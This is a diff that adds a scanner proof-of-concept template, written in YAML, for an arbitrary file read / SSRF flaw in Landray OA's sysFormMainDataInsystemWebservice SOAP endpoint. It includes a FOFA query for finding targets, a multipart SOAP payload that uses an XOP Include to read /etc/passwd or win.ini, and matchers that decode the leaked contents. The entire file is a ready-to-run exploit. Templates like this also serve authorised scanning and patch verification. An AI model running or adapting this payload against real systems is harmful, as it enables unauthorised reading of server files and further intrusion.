@@ -1,0 +1,66 @@
+id: poc-yaml-landray-sysformmaindataInsystemwebservice-fileread
+info:
+  name: 蓝凌OA sysFormMainDataInsystemWebservice 任意文件读取漏洞
+  severity: high
+  tags:
+  - ssrf
+  - 文件读取
+  finger: landray
+  fofa: app="Landray-OA系统"
+variables:
+  r_data_linux: 'file:///etc/passwd
+
+    file:///c://windows/win.ini'
+firstRequest:
+  method: GET
+  path: /login.jsp
+  expression: "status_code == 200 && \ncontains(body,\"Com_Parameter\")\n"
+requests:
+- method: POST
+  path: /sys/webservice/sysFormMainDataInsystemWebservice
+  headers:
+    Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+  data: '------4upt9dwdca8rtwq9osuz
+
+    Content-Disposition: form-data; name="a"
+
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.maindata.xform.sys.kmss.landray.com/">
+
+    <soapenv:Header/>
+
+    <soapenv:Body>
+
+    <web:getData>
+
+    <arg0>
+
+    <beginTimeStamp>a</beginTimeStamp>
+
+    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="{{.r_data_linux}}"/></count>
+
+    </arg0>
+
+    </web:getData>
+
+    </soapenv:Body>
+
+    </soapenv:Envelope>
+
+    ------4upt9dwdca8rtwq9osuz--
+
+    '
+  expression: 'status_code == 500 &&  contains(body, "Unmarshalling Error") &&
+
+    matches(body, `意外的文本 "(.+)"`)  &&
+
+    (
+
+    contains(base64_decode(regex_find(body,`意外的文本 "(.+)"`)),"bit app support") ||
+
+    matches(base64_decode(regex_find(body,`意外的文本 "(.+)"`)),"root:.*:0:0:")
+
+    )
+
+    '
+transport: http
